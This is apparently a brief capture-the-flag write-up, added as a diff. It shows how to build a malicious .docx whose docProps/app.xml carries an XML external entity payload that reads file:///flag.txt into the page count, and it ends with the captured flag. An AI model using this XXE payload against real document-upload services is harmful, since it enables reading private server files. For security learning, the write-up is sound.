@@ -1,0 +1,18 @@
+create hello.docx with Word
+mv hello.docx hello.zip
+unzip hello.zip
+
+docProps/app.xml is responsible for Number of pages
+
+edit docProps/app.xml to
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM 'file:///flag.txt'> ]>
+	<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Pages>&xxe;</Pages></Properties>
+
+
+move all the files to directory tmp
+7z a malicious.zip ./tmp/*
+mv malicious.zip malicious.docx
+
+# Upload
+Number of pages : darkCTF{1nj3ct1ng_d0cx_f0r_xx3}
